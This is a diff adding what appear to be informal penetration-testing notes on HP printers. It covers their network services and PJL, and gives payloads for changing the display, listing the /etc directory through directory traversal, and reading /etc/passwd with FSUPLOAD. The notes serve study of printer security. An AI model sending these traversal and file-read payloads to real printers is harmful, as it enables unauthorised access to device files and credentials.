@@ -1,0 +1,45 @@
+PJL - heart of communication with print queues
+most printers seldom get updates (wheeeeee)
+
+HP printers have 5 ways of communicating
+	HTTP
+	HTTPS
+	Telnet
+	SNMP
+	PCL/PJL
+
+
+HTTP, HTTPS served via embedded web server(EWS)
+	any tech that knows what they're doing disables port 80 for port 443
+
+Telnet
+	same password as the EWS
+
+SNMP
+	snmpwalk?
+
+PJL (printer job language)
+	extension of PCL(printer command language)
+	PCL is how jobs are communicated to printers
+	interesting features
+	supports password protection (seperate from EWS an telnet)
+		most printers won't have this set
+	
+
+test payload (only if printer has display - changes display text to Igor!!!)
+	use echo and nc to send
+	*[ESC] is replaced with the actual escape character 0x1b
+
+	[ESC]%-12345X @PJL RDYMSG DISPLAY="Igor!!!!"
+	[ESC]%-12345X
+
+
+directory traversal
+	This code lists out the contents of the ‘etc’ directory for me:
+	[ESC]%-12345X@PJL FSDIRLIST NAME="0:\\..\\..\\..\\etc" ENTRY=1 COUNT=999999
+	[ESC]%-12345X
+	
+
+This code (the FSUPLOAD command) allowed me to view the contents of the file by sending a print job to the printer.
+	[ESC]%-12345X@PJL FSUPLOAD NAME="0:\\..\\..\\..\\etc\passwd" OFFSET=0 SIZE=22000
+	[ESC]%-12345X
